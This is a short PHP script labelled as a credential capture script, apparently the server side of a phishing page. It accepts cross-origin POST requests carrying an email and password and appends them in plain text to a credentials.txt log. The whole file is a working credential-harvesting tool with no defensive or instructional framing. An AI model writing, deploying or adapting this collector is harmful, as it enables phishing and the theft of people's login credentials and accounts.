<?php
// Credential capture script
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    if ($data && isset($data['email']) && isset($data['password'])) {
        $logEntry = sprintf(
            "[%s] Email: %s | Password: %s\n",
            $data['timestamp'] ?? date('Y-m-d H:i:s'),
            $data['email'],
            $data['password']
        );

        // Append to credentials log file
        file_put_contents('credentials.txt', $logEntry, FILE_APPEND | LOCK_EX);

        echo json_encode(['status' => 'success']);
    } else {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Invalid data']);
    }
} else {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
}
?>
